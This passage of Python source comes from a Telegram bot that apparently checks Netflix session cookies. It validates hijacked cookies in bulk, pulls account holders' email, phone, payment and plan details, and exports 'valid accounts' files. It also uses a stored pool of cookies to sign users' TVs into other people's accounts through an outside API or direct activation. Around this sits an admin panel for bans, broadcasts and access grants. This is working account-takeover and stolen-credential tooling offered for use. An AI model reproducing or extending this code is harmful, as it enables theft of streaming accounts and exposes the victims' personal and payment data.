            try: bot.send_message(int(uid_str), "✅ **You have been unbanned. You can use the bot again.**", parse_mode='Markdown')
            except: pass
            _show_manage_access(call.message.chat.id, call.message.message_id)
        elif call.data == "mgr_ban":
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="mgr_list"))
            msg = bot.send_message(call.message.chat.id, "🚫 **Ban a User**\n\nSend the **User ID** to ban:", reply_markup=markup, parse_mode='Markdown')
            def _wait_ban_id(m, orig_chat=call.message.chat.id):
                if not is_admin(m.chat.id): return
                uid_str = (m.text or "").strip()
                if not uid_str.lstrip('-').isdigit():
                    return bot.reply_to(m, "❌ Invalid user ID. Must be a number.")
                uid = int(uid_str)
                ban_user(uid)
                try: bot.send_message(uid, "🚫 **You have been banned from this bot.**", parse_mode='Markdown')
                except: pass
                bot.reply_to(m, f"✅ **User `{uid}` has been banned.**", parse_mode='Markdown')
                _show_manage_access(orig_chat)
            bot.register_next_step_handler(msg, _wait_ban_id)
        elif call.data == "mgr_grant":
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="mgr_list"))
            msg = bot.send_message(call.message.chat.id, "➕ **Grant Bulk Access**\n\nSend: `<user_id> <hours>` (use `0` for Lifetime)\nExample: `123456789 24`", reply_markup=markup, parse_mode='Markdown')
            def _wait_grant(m, orig_chat=call.message.chat.id):
                if not is_admin(m.chat.id): return
                parts = (m.text or "").strip().split()
                if len(parts) < 2 or not parts[0].isdigit() or not parts[1].isdigit():
                    return bot.reply_to(m, "❌ Invalid format. Send: `<user_id> <hours>`\nExample: `123456789 24`", parse_mode='Markdown')
                uid = int(parts[0])
                hours = int(parts[1])
                if hours == 0:
                    bulk_access[uid] = float('inf')
                    label = "Lifetime"
                else:
                    bulk_access[uid] = time.time() + hours * 3600
                    label = f"{hours} Hour(s)"
                try: bot.send_message(uid, f"✅ **Bulk Access Granted for {label}!**\nYou can now check bulk cookies.", parse_mode='Markdown')
                except: pass
                bot.reply_to(m, f"✅ **Granted `{label}` to user `{uid}`.**", parse_mode='Markdown')
                _show_manage_access(orig_chat)
            bot.register_next_step_handler(msg, _wait_grant)

    def _do_broadcast_prompt(message):
        if not is_admin(message.chat.id): return
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("📤 New Broadcast", callback_data="bc_new"),
            types.InlineKeyboardButton("📋 Past Messages", callback_data="bc_past")
        )
        bot.reply_to(message, "📣 **Broadcast Panel**\nChoose an option:", reply_markup=markup, parse_mode='Markdown')

    @bot.message_handler(commands=['broadcast'])
    def broadcast_cmd(message):
        _do_broadcast_prompt(message)

    @bot.message_handler(func=lambda m: m.text == "📣 Broadcast")
    def broadcast_btn(message):
        if not is_admin(message.chat.id): return
        _do_broadcast_prompt(message)

    @bot.callback_query_handler(func=lambda call: call.data.startswith("bc_"))
    def handle_broadcast_panel(call):
        if not is_admin(call.from_user.id):
            safe_answer(call.id, "❌ Admin only!", show_alert=True)
            return

        if call.data == "bc_new":
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="bc_panel"))
            msg = bot.send_message(call.message.chat.id, "📤 **Send your broadcast message:**\n(text, photo, video, file — any type)", reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(msg, perform_broadcast)

        elif call.data == "bc_past":
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            _show_past_broadcasts(call.message.chat.id)

        elif call.data.startswith("bc_del_"):
            bc_id = call.data[7:]
            bc_entry = next((b for b in broadcast_log if b['id'] == bc_id), None)
            if not bc_entry:
                safe_answer(call.id, "❌ Not found (already deleted?)", show_alert=True)
                return
            del_count = 0
            for uid_str, msg_id in bc_entry.get('msg_ids', {}).items():
                try:
                    bot.delete_message(int(uid_str), msg_id)
                    del_count += 1
                except: pass
            broadcast_log.remove(bc_entry)
            safe_answer(call.id, f"🗑️ Deleted from {del_count} users!")
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            _show_past_broadcasts(call.message.chat.id)

        elif call.data == "bc_panel":
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            _do_broadcast_prompt(call.message)

        elif call.data == "bc_back":
            try: bot.delete_message(call.message.chat.id, call.message.message_id)
            except: pass
            bot.send_message(call.message.chat.id, "🏠 Main Menu", reply_markup=_main_keyboard(call.message.chat.id), parse_mode='Markdown')

    def _show_past_broadcasts(chat_id):
        markup = types.InlineKeyboardMarkup()
        if broadcast_log:
            recent = broadcast_log[-3:]
            txt = "📋 **Past Broadcasts** (up to 3):\n\n"
            for i, bc in enumerate(recent, 1):
                ts_str = datetime.fromtimestamp(bc['ts']).strftime('%d-%b %H:%M')
                txt += f"`#{i}` — {ts_str}\n_{bc['preview']}_\n\n"
                markup.add(types.InlineKeyboardButton(f"🗑️ Delete #{i} from all DMs", callback_data=f"bc_del_{bc['id']}"))
        else:
            txt = "📋 **No past broadcasts yet.**"
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="bc_panel"))
        bot.send_message(chat_id, txt, reply_markup=markup, parse_mode='Markdown')

    def perform_broadcast(message):
        if not is_admin(message.chat.id): return

        def _broadcast():
            try:
                if not os.path.exists(USERS_FILE):
                    bot.reply_to(message, "❌ No users found.")
                    return
                with open(USERS_FILE, "r") as f:
                    users = [u.strip() for u in f.read().splitlines() if u.strip()]
                msg_ids = {}
                count = 0
                for uid in users:
                    try:
                        if message.content_type == 'text':
                            sent = bot.send_message(uid, message.text)
                        elif message.content_type == 'photo':
                            sent = bot.send_photo(uid, message.photo[-1].file_id, caption=message.caption)
                        elif message.content_type == 'document':
                            sent = bot.send_document(uid, message.document.file_id, caption=message.caption)
                        elif message.content_type == 'video':
                            sent = bot.send_video(uid, message.video.file_id, caption=message.caption)
                        elif message.content_type == 'audio':
                            sent = bot.send_audio(uid, message.audio.file_id, caption=message.caption)
                        elif message.content_type == 'voice':
                            sent = bot.send_voice(uid, message.voice.file_id, caption=message.caption)
                        else:
                            continue
                        msg_ids[str(uid)] = sent.message_id
                        count += 1
                        time.sleep(0.05)
                    except: pass

                if message.content_type == 'text':
                    preview = (message.text or "")[:60]
                else:
                    preview = f"({message.content_type})"

                bc_entry = {
                    'id': str(uuid.uuid4())[:8],
                    'ts': time.time(),
                    'preview': preview,
                    'msg_ids': msg_ids
                }
                broadcast_log.append(bc_entry)
                while len(broadcast_log) > 3:
                    broadcast_log.pop(0)

                markup = types.InlineKeyboardMarkup()
                markup.add(types.InlineKeyboardButton("📋 View Past Broadcasts", callback_data="bc_past"))
                bot.reply_to(message, f"✅ **Broadcast sent to {count} users.**", reply_markup=markup, parse_mode='Markdown')
            except Exception as e:
                bot.reply_to(message, f"❌ Error: {e}")

        bot.reply_to(message, "🚀 **Broadcasting in background...**", parse_mode='Markdown')
        GLOBAL_EXECUTOR.submit(_broadcast)

    @bot.message_handler(func=lambda m: m.text == "🛑 Stop System")
    def stop_sys(message):
        save_user(message.chat.id)
        uid = message.chat.id
        if uid in user_modes:
            user_modes[uid]['stop'] = True
        else:
            user_modes[uid] = {'stop': True}
        
        # Send partial results if there are any hits from the stopped scan
        hits = partial_hits.pop(uid, [])
        if hits:
            summary = build_hits_txt(hits, title="PARTIAL RESULTS (SCAN STOPPED)")
            with io.BytesIO(summary.encode('utf-8')) as f:
                f.name = f"Netflix_Partial_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                bot.send_document(uid, f, caption=f"🛑 **Scan Stopped!**\n✅ **{len(hits)} valid accounts** found before stopping.", parse_mode='Markdown')
        else:
            bot.reply_to(message, "**🛑 Scanning Stopped.**\nNo valid accounts were found yet.", parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data.startswith('req_bulk_'))
    def handle_bulk_request(call):
        requester_id = int(call.data.split('_')[2])
        safe_answer(call.id, "✅ Request Sent to Admin!")
        
        markup = types.InlineKeyboardMarkup()
        markup.row(
            types.InlineKeyboardButton("1H ✅", callback_data=f"app_bulk_{requester_id}_1"),
            types.InlineKeyboardButton("5H ✅", callback_data=f"app_bulk_{requester_id}_5"),
            types.InlineKeyboardButton("10H ✅", callback_data=f"app_bulk_{requester_id}_10"),
        )
        markup.row(
            types.InlineKeyboardButton("24H ✅", callback_data=f"app_bulk_{requester_id}_24"),
            types.InlineKeyboardButton("♾️ Lifetime", callback_data=f"app_bulk_{requester_id}_0"),
            types.InlineKeyboardButton("❌ Deny", callback_data=f"deny_bulk_{requester_id}"),
        )
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="manage_back"))
        
        bot.send_message(ADMIN_ID, f"🔔 **Bulk Access Request**\nUser ID: `{requester_id}`\nName: {call.from_user.first_name}\n\nChoose duration:", reply_markup=markup, parse_mode='Markdown')
        bot.edit_message_text("✅ **Request Sent!**\nWait for Admin approval.", call.message.chat.id, call.message.message_id, parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data.startswith('app_bulk_'))
    def approve_bulk(call):
        if not is_admin(call.from_user.id): return
        parts = call.data.split('_')
        requester_id = int(parts[2])
        hours = int(parts[3]) if len(parts) > 3 else 1

        if hours == 0:
            bulk_access[requester_id] = float('inf')
            label = "Lifetime"
        else:
            bulk_access[requester_id] = time.time() + hours * 3600
            label = f"{hours} Hour(s)"

        bot.edit_message_text(f"✅ **Access Granted to `{requester_id}` for {label}.**", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        try:
            bot.send_message(requester_id, f"✅ **Bulk Access Enabled!**\n\nYou can now upload files for **{label}**.", parse_mode='Markdown')
        except: pass

    @bot.callback_query_handler(func=lambda call: call.data.startswith('deny_bulk_'))
    def deny_bulk(call):
        if not is_admin(call.from_user.id): return
        requester_id = int(call.data.split('_')[2])
        
        bot.edit_message_text(f"❌ **Request Denied for {requester_id}.**", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        try:
            bot.send_message(requester_id, "❌ **Bulk Access Request Denied.**\nTry again later.", parse_mode='Markdown')
        except: pass

    @bot.callback_query_handler(func=lambda call: call.data in ["bulk_stop", "bulk_back"])
    def handle_bulk_inline_controls(call):
        uid = call.message.chat.id
        if call.data in ("bulk_stop", "bulk_back"):
            if uid not in user_modes:
                user_modes[uid] = {}
            user_modes[uid]['stop'] = True
            safe_answer(call.id, "🛑 Stopping scan..." if call.data == "bulk_stop" else "⬅️ Going back...")

            hits = partial_hits.pop(uid, [])
            if hits:
                summary = build_hits_txt(hits, title="PARTIAL RESULTS (SCAN STOPPED)")
                with io.BytesIO(summary.encode('utf-8')) as f:
                    f.name = f"Netflix_Partial_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    try:
                        bot.send_document(uid, f, caption=f"🛑 **Scan Stopped!**\n✅ **{len(hits)} valid accounts** found.", parse_mode='Markdown')
                    except: pass
            else:
                try:
                    bot.edit_message_text("🛑 **Scan Stopped.**\nNo valid accounts found.",
                                          uid, call.message.message_id, parse_mode='Markdown')
                except: pass

            if call.data == "bulk_back":
                start(call.message)

    @bot.message_handler(func=lambda m: m.text == "📩 Send Here (DM)")
    def mode_dm(message):
        save_user(message.chat.id)
        if not _gate_check(message.chat.id): return
        user_modes[message.chat.id] = {'target': message.chat.id, 'stop': False}
        bot.reply_to(message, "**✅ DM Mode Active.** Send file or text now.", parse_mode='Markdown')

    @bot.message_handler(func=lambda m: m.text == "📡 Send to Channel")
    def mode_ch(message):
        if not is_admin(message.chat.id): return
        save_user(message.chat.id)
        msg = bot.reply_to(message, "**📡 Enter Channel ID** (e.g., -100xxxx):", parse_mode='Markdown')
        bot.register_next_step_handler(msg, save_ch)

    def save_ch(message):
        try:
            if not message.text: raise ValueError("No text")
            chat_id = int(message.text.strip())
            # Verify the bot can actually post to this channel
            try:
                me = bot.get_me()
                member = bot.get_chat_member(chat_id, me.id)
                if member.status not in ['administrator', 'creator']:
                    bot.reply_to(message, "❌ **Bot is not admin in that channel!**\nAdd the bot as admin first, then try again.", parse_mode='Markdown')
                    return
            except Exception as verify_err:
                bot.reply_to(message, f"❌ **Could not verify channel.**\nMake sure the ID is correct and bot is added as admin.\nError: `{verify_err}`", parse_mode='Markdown')
                return
            user_modes[message.chat.id] = {'target': chat_id, 'stop': False}
            bot.reply_to(message, "**✅ Channel Verified!** Hits will be sent there.", parse_mode='Markdown')
        except ValueError:
            bot.reply_to(message, "❌ Invalid ID. Send a numeric channel ID like `-1001234567890`.")

    def _tv_options_markup():
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("👑 Use Admin Cookie", callback_data="tv_admin"))
        markup.add(types.InlineKeyboardButton("👤 Use Your Cookie", callback_data="tv_user"))
        markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
        return markup

    @bot.message_handler(func=lambda m: m.text == "📺 TV Login")
    def tv_login_start(message):
        save_user(message.chat.id)
        if not _gate_check(message.chat.id): return
        bot.reply_to(message, "📺 **TV Login Mode**\n\nChoose your cookie source:", reply_markup=_tv_options_markup(), parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data in ["tv_admin", "tv_user", "tv_admin_change", "tv_back"])
    def tv_login_choice(call):
        try: bot.clear_step_handler_by_chat_id(chat_id=call.message.chat.id)
        except: pass
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass

        if call.data == "tv_back":
            return start(call.message)

        if call.data in ["tv_admin", "tv_admin_change"]:
            chat_id = call.message.chat.id
            status_msg = bot.send_message(chat_id, "⏳ **Checking Admin DB for Valid Cookie...**", parse_mode='Markdown')
            smsg_id = status_msg.message_id

            def _fetch_admin_cookie(cid=chat_id, sid=smsg_id):
                if not supabase:
                    bot.edit_message_text("❌ Database not configured.", cid, sid)
                    return
                try:
                    db_res = supabase.table('netflix').select("*").limit(30).execute()
                except Exception as e:
                    bot.edit_message_text(f"❌ Database error: `{e}`", cid, sid, parse_mode='Markdown')
                    return

                if not db_res.data:
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
                    bot.edit_message_text(
                        "❌ **Database is Empty!**\n\nNo cookies stored in the database yet.\nAdmin needs to add cookies first using ➕ Add Cookie.",
                        cid, sid, reply_markup=markup, parse_mode='Markdown'
                    )
                    return

                valid_acc = None
                valid_nid_raw = None
                rows = list(db_res.data)
                random.shuffle(rows)
                for row in rows:
                    c = _db_row_cookie(row)
                    if not c:
                        continue
                    chk = check_cookie_fast(c)
                    if chk.get('valid'):
                        valid_acc = chk
                        valid_nid_raw = c
                        break

                if not valid_acc:
                    markup = types.InlineKeyboardMarkup()
                    markup.add(types.InlineKeyboardButton("🔄 Try Again", callback_data="tv_admin_change"))
                    markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
                    bot.edit_message_text(
                        "❌ **No Valid Cookies Found!**\n\nAll stored cookies are expired or invalid.\nAdmin needs to add fresh cookies via ➕ Add Cookie.",
                        cid, sid, reply_markup=markup, parse_mode='Markdown'
                    )
                    return

                valid_nid = parse_smart_cookie(valid_nid_raw)
                valid_cookie_str = f"NetflixId={valid_nid}" if valid_nid else valid_nid_raw
                data = valid_acc['data']
                info_text = (
                    f"✅ **Admin Cookie Ready!**\n"
                    f"📧 Email: `{data.get('email', 'N/A')}`\n"
                    f"👑 Plan: `{data.get('plan', 'N/A')}`\n"
                    f"📺 Quality: `{data.get('quality', 'Unknown')}`\n\n"
                    f"🔢 **Enter 8-Digit TV Code (e.g. 1234-5678):**"
                )

                btn_markup = types.InlineKeyboardMarkup()
                if valid_acc.get('link3') and str(valid_acc.get('link3', '')).startswith('http'):
                    btn_markup.add(types.InlineKeyboardButton("📺 Open Netflix TV Login Page", url=valid_acc['link3']))
                btn_markup.add(types.InlineKeyboardButton("🔄 Change Account", callback_data="tv_admin_change"))
                btn_markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))

                if valid_acc.get('screenshot'):
                    try:
                        bot.delete_message(cid, sid)
                        img = io.BytesIO(valid_acc['screenshot'])
                        img.name = 'screenshot.jpg'
                        sent_msg = bot.send_photo(cid, img, caption=info_text, reply_markup=btn_markup, parse_mode='Markdown')
                        _link3 = valid_acc.get('link3')
                        bot.register_next_step_handler(sent_msg, lambda m, c_raw=valid_cookie_str, l3=_link3: GLOBAL_EXECUTOR.submit(tv_execute, m, c_raw, l3))
                        return
                    except: pass

                try: bot.edit_message_text(info_text, cid, sid, reply_markup=btn_markup, parse_mode='Markdown')
                except: pass
                _link3 = valid_acc.get('link3')
                bot.register_next_step_handler_by_chat_id(cid, lambda m, c_raw=valid_cookie_str, l3=_link3: GLOBAL_EXECUTOR.submit(tv_execute, m, c_raw, l3))

            GLOBAL_EXECUTOR.submit(_fetch_admin_cookie)

        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
            msg = bot.send_message(call.message.chat.id, "📺 **TV Login Mode**\n\n1️⃣ Send your **Netflix Cookie** (text, .txt, or .zip file).", reply_markup=markup, parse_mode='Markdown')
            bot.register_next_step_handler(msg, tv_login_cookie)

    def tv_login_cookie(message):
        cookie = None
        if message.content_type == 'document':
            try:
                file_info = bot.get_file(message.document.file_id)
                raw = bot.download_file(file_info.file_path)
                raw_text = _extract_raw_text_from_download(raw, message.document.file_name or "")
                found = extract_cookies_from_block(raw_text)
                if len(found) > 1:
                    return bot.reply_to(
                        message,
                        "⚠️ **Single Cookie Only!**\n\nPlease send only one cookie in file/zip for TV Login.",
                        parse_mode='Markdown',
                        reply_markup=_tv_options_markup()
                    )
                cookie = found[0] if found else None
            except: pass
            if not cookie:
                return bot.reply_to(message, "❌ No valid Netflix cookie found in file.", reply_markup=_tv_options_markup())
        elif message.text:
            if message.text in ["🛑 Stop System", "/start", "📺 TV Login", "🎁 Generate Netflix"]:
                return start(message)
            found = extract_cookies_from_block(message.text.strip())
            if len(found) > 1:
                return bot.reply_to(
                    message,
                    "⚠️ **Single Cookie Only!**\n\nPlease send only one cookie for TV Login.",
                    parse_mode='Markdown',
                    reply_markup=_tv_options_markup()
                )
            cookie = found[0] if found else message.text.strip()
        else:
            return bot.reply_to(message, "❌ Please send your Netflix cookie as text or .txt file.", reply_markup=_tv_options_markup())

        if not cookie or len(cookie) < 10:
            return bot.reply_to(message, "❌ Invalid Cookie. Try again or press Back.", reply_markup=_tv_options_markup())

        status_msg = bot.reply_to(message, "⏳ **Checking Cookie Validity...**", parse_mode='Markdown')
        res = check_cookie(cookie, get_screenshot=False)

        if not res.get("valid"):
            back_markup = types.InlineKeyboardMarkup()
            back_markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
            return bot.edit_message_text(
                f"❌ **Invalid Cookie!**\nReason: {res.get('msg', 'Expired or Dead')}",
                message.chat.id, status_msg.message_id,
                reply_markup=back_markup, parse_mode='Markdown')

        data = res['data']
        info_text = (
            f"✅ **Cookie Valid!**\n"
            f"📧 Email: `{data.get('email', 'N/A')}`\n"
            f"👑 Plan: `{data.get('plan', 'N/A')}`\n"
            f"📺 Quality: `{data.get('quality', 'Unknown')}`\n"
            f"🌍 Country: `{res.get('country', 'Unknown')}`\n\n"
            f"💰 Price: `{data.get('price', 'Unknown')}`\n"
            f"💳 Payment: `{data.get('payment', 'Unknown')}`\n"
            f"☎️ Phone: `{data.get('phone', 'N/A')}`\n\n"
            f"🔢 **Enter 8-Digit TV Code** (any format: `12345678` / `1234-5678` / `1 2 3 4 5 6 7 8`):"
        )

        back_markup = types.InlineKeyboardMarkup()
        if res.get('link3') and str(res.get('link3', '')).startswith('http'):
            back_markup.add(types.InlineKeyboardButton("📺 Open Netflix TV Login Page", url=res['link3']))
        back_markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
        bot.edit_message_text(info_text, message.chat.id, status_msg.message_id, reply_markup=back_markup, parse_mode='Markdown')
        _link3 = res.get('link3')
        bot.register_next_step_handler(status_msg, lambda m, c_raw=cookie, l3=_link3: GLOBAL_EXECUTOR.submit(tv_execute, m, c_raw, l3))

    def tv_execute(message, cookie_raw, link3=None):
        code_raw = message.text or ""
        code_clean = re.sub(r'\D', '', code_raw)
        
        nid = parse_smart_cookie(cookie_raw) if cookie_raw else None
        if not nid:
            bot.reply_to(message, "❌ **Cookie is invalid.** Please restart with /start.")
            return

        if len(code_clean) < 4 or len(code_clean) > 12:
            markup = types.InlineKeyboardMarkup()
            markup.add(types.InlineKeyboardButton("🔙 Back", callback_data="tv_back"))
            msg = bot.reply_to(message, "❌ **Invalid TV Code!** Please send the code shown on your TV screen.\n\nAccepted formats:\n• `12345678`\n• `1234-5678`\n• `1234 5678`\n• `12345 6789`\n• `1234`", reply_markup=markup, parse_mode='Markdown')
            # Propagate link3 so next retry can also use it
            bot.register_next_step_handler(msg, lambda m, c_raw=cookie_raw, l3=link3: GLOBAL_EXECUTOR.submit(tv_execute, m, c_raw, l3))
            return
            
        status_msg = bot.reply_to(message, "⏳ **Processing TV Login...**")
        success = False
        result_text = ""
        try:
            resp = requests.post(
                "https://nftoken.site/v1/tv.php",
                json={
                    "key": NFTOKEN_KEY,
                    "cookie": f"NetflixId={nid}",
                    "tv_code": code_clean
                },
                timeout=15
            )
            # Strip UTF-8 BOM (\ufeff) that some servers prepend
            raw_text = resp.text.strip().lstrip('\ufeff') if resp.text else ""
            api_available = (resp.status_code == 200)
            try:
                api_res = resp.json() if (api_available and raw_text) else {}
            except Exception:
                api_res = {}
                api_available = False

            # Detect API responses that look like garbage HTML (e.g. the nftoken
            # server returning a 404 error page with a 200 status code).
            _api_msg = api_res.get("message", "") if isinstance(api_res, dict) else ""
            # Match an HTML opening or closing tag like <h1>, </div>, <!DOCTYPE ...>
            _api_msg_is_html = bool(_api_msg and re.search(r'</?[a-zA-Z!][^>]*>', _api_msg))

            if api_available and api_res.get("status") == "SUCCESS":
                result_text = f"✅ **TV LOGIN SUCCESS!**\n\n{api_res.get('message', 'Your TV is now connected.')}"
                success = True
            elif api_available and _api_msg and not _api_msg_is_html:
                # Genuine API failure message (e.g. "Invalid TV code")
                result_text = f"❌ **TV LOGIN FAILED**\n\n{_clean_api_msg(_api_msg)}"
                success = False
            else:
                # API unavailable, returned non-JSON, or returned garbage HTML — try direct activation
                # Pass link3 so Playwright navigates to the confirmed-working activation URL first
                try:
                    bot.edit_message_text(
                        "⏳ **Trying direct Netflix activation...**",
                        message.chat.id, status_msg.message_id
                    )
                except Exception:
                    pass
                pw_ok, pw_msg = _tv_activate_requests(nid, code_clean, link3=link3)
                if pw_ok:
                    result_text = f"✅ **TV LOGIN SUCCESS!**\n\n{pw_msg}"
                    success = True
                else:
                    result_text = f"❌ **TV LOGIN FAILED**\n\n{_clean_api_msg(pw_msg)}"
                    success = False
        except Exception as e:
            # Network error — try direct Playwright activation with link3
            try:
                bot.edit_message_text(
                    "⏳ **API error — trying direct Netflix activation...**",
                    message.chat.id, status_msg.message_id
                )
            except Exception:
                pass
            try:
                pw_ok, pw_msg = _tv_activate_requests(nid, code_clean, link3=link3)
                if pw_ok:
                    result_text = f"✅ **TV LOGIN SUCCESS!**\n\n{pw_msg}"
                    success = True
                else:
                    result_text = f"❌ **TV LOGIN FAILED**\n\n{_clean_api_msg(pw_msg)}"
                    success = False
            except Exception as e2:
                print(f"[TV Execute] Direct activation error: {e2}")
                result_text = f"❌ **TV Login Failed.**\n\nPlease check your TV code and try again."
                success = False

        if success:
            bot.edit_message_text(result_text, message.chat.id, status_msg.message_id, parse_mode='Markdown')
            import time as _time
            _time.sleep(2)
            start(message)
        else:
            bot.edit_message_text(result_text, message.chat.id, status_msg.message_id,
                                  reply_markup=_tv_options_markup(), parse_mode='Markdown')

    @bot.callback_query_handler(func=lambda call: call.data in ["out_cookie", "out_both"])
    def handle_output_format(call):
        chat_id = call.message.chat.id
        hits = bulk_results.get(chat_id, [])
        if not hits: 
            return safe_answer(call.id, "No results found or session expired.", show_alert=True)
        
        safe_answer(call.id, "Generating File...")
        include_links = (call.data == "out_both")
        summary = build_hits_txt(hits, title="NETFLIX VALID ACCOUNTS", include_links=include_links)

        with io.BytesIO(summary.encode('utf-8')) as f:
            f.name = f"Netflix_Hits_@F88UF_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            bot.send_document(chat_id, f, caption=f"📂 **{len(hits)} Valid Netflix Accounts**\n✅ Checked by @F88UF", parse_mode='Markdown')
            
        try: bot.delete_message(chat_id, call.message.message_id)
        except: pass

    @bot.callback_query_handler(func=lambda call: call.data == "gen_retry")
    def gen_retry(call):
        safe_answer(call.id, "🔄 Retrying...")
        try: bot.delete_message(call.message.chat.id, call.message.message_id)
        except: pass
        generate_netflix(call.message)

    # ── 🔍 Free Check (no API key, fast, no links) ─────────────────────────
    @bot.message_handler(func=lambda m: m.text in ["🔍 Free Check", "💎 Premium Check"])
    def cookie_check_start(message):
        save_user(message.chat.id)
        if not _gate_check(message.chat.id): return
        mode = "free" if message.text == "🔍 Free Check" else "premium"
        if mode == "premium" and not is_admin(message.chat.id):
            # Non-admin: premium check also allowed but 1 cookie/day
            pass
        mode_label = "🔍 Free Check (No API)" if mode == "free" else "💎 Premium Check (API + Links)"
        msg = bot.reply_to(message,
            f"*{mode_label}*\n\n"
            "Send your Netflix cookie:\n"
            "• Paste cookie text\n"
            "• Send a `.txt` file\n"
            "• Send a `.zip` file\n\n"
            "⚠️ *Only 1 cookie will be checked*",
            parse_mode='Markdown')
        bot.register_next_step_handler(msg, lambda m, md=mode: GLOBAL_EXECUTOR.submit(_handle_cookie_check, m, md))

    def _handle_cookie_check(message, mode="free"):
        """Process single cookie check — free (no API) or premium (API + links)."""
        uid = message.chat.id
        cookies = []

        if message.content_type == 'document':
            try:
                fi = bot.get_file(message.document.file_id)
                data = bot.download_file(fi.file_path)
                fname = (message.document.file_name or "").lower()
                if fname.endswith('.zip'):
                    raw = _extract_raw_text_from_download(data, fname)
                else:
                    raw = data.decode('utf-8', errors='ignore')
                cookies = extract_cookies_from_block(raw)
            except Exception as e:
                bot.reply_to(message, f"❌ File error: {e}")
                return
        elif message.text:
            cookies = extract_cookies_from_block(message.text.strip())

        if not cookies:
            bot.reply_to(message, "❌ No valid cookie found.\n\nSupported: JSON, Netscape TSV, raw `NetflixId=...`")
            return

        # Single cookie only
        cookie = cookies[0]
        nid = parse_smart_cookie(cookie)
        if not nid:
            bot.reply_to(message, "❌ Could not parse cookie. Please check the format.")
            return

        if len(cookies) > 1:
            bot.reply_to(message, f"⚠️ Multiple cookies detected — checking only the first one.")

        st = bot.reply_to(message, "⏳ *Checking cookie...*", parse_mode='Markdown')

        def _upd(txt):
            try: bot.edit_message_text(txt, uid, st.message_id, parse_mode='Markdown')
            except Exception: pass

        ts = datetime.now().strftime("%d %b %Y • %H:%M")

        if mode == "free":
            # Direct Netflix check — no API key
            _upd("🔍 *Checking validity (direct)...*")
            valid, html = _check_netflix_session(nid)
            if not valid:
                _upd("❌ *Dead Cookie*\n\nThis cookie is expired or invalid.")
                return
            # Extract info
            deep = {"plan": "Unknown", "email": "N/A", "country": "Unknown",
                    "payment": "Unknown", "expiry": "N/A", "quality": "Unknown",
                    "profiles": [], "member_since": "Unknown", "phone": "N/A",
                    "price": "Unknown", "extra_members": "No ❌", "has_ads": "No ❌",
                    "name": "Unknown", "max_streams": "Unknown"}
            if html:
                try: deep = extract_deep_details(html)
                except Exception: pass
            country = deep.get("country", "Unknown")
            flag_map = {"US":"🇺🇸","GB":"🇬🇧","IN":"🇮🇳","CA":"🇨🇦","AU":"🇦🇺","BR":"🇧🇷",
                        "MX":"🇲🇽","TR":"🇹🇷","PK":"🇵🇰","ID":"🇮🇩","PH":"🇵🇭"}
            flag = flag_map.get(country.upper(), "🌍")

            result_msg = (
                f"✅ *VALID COOKIE*\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"📧 *Email:* `{deep.get('email','N/A')}`\n"
                f"👑 *Plan:* `{deep.get('plan','Unknown')}`\n"
                f"🌍 *Country:* `{country}` {flag}\n"
                f"🖥 *Quality:* `{deep.get('quality','Unknown')}`\n"
                f"💰 *Price:* `{deep.get('price','Unknown')}`\n"
                f"💳 *Payment:* `{deep.get('payment','Unknown')}`\n"
                f"📅 *Next Bill:* `{deep.get('expiry','N/A')}`\n"
                f"🗓 *Member Since:* `{deep.get('member_since','N/A')}`\n"
                f"☎️ *Phone:* `{deep.get('phone','N/A')}`\n"
                f"🕐 *Checked:* {ts}"
            )
            # Send msg + txt file
            _upd(result_msg)
            txt_content = (
                f"== NETFLIX VALID (Free Check) ==\n"
                f"Email      : {deep.get('email','N/A')}\n"
                f"Plan       : {deep.get('plan','Unknown')}\n"
                f"Country    : {country}\n"
                f"Quality    : {deep.get('quality','Unknown')}\n"
                f"Price      : {deep.get('price','Unknown')}\n"
                f"Payment    : {deep.get('payment','Unknown')}\n"
                f"Next Bill  : {deep.get('expiry','N/A')}\n"
                f"Member     : {deep.get('member_since','N/A')}\n"
                f"Phone      : {deep.get('phone','N/A')}\n"
                f"Cookie     : NetflixId={nid}\n"
                f"Checked    : {ts}\n"
                f"{'='*40}\n"
            )
            try:
                with io.BytesIO(txt_content.encode('utf-8')) as f_obj:
                    f_obj.name = f"Netflix_Free_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    bot.send_document(uid, f_obj, caption="📄 Cookie details")
            except Exception:
                pass

        else:
            # Premium check — API key + login links
            _upd("💎 *Checking via API...*")
            res = check_cookie_fast(cookie)
            if not res.get("valid"):
                _upd("❌ *Dead Cookie*\n\nThis cookie is expired or invalid.")
                return
            data = res.get("data", {})
            country = res.get("country", data.get("country", "Unknown"))
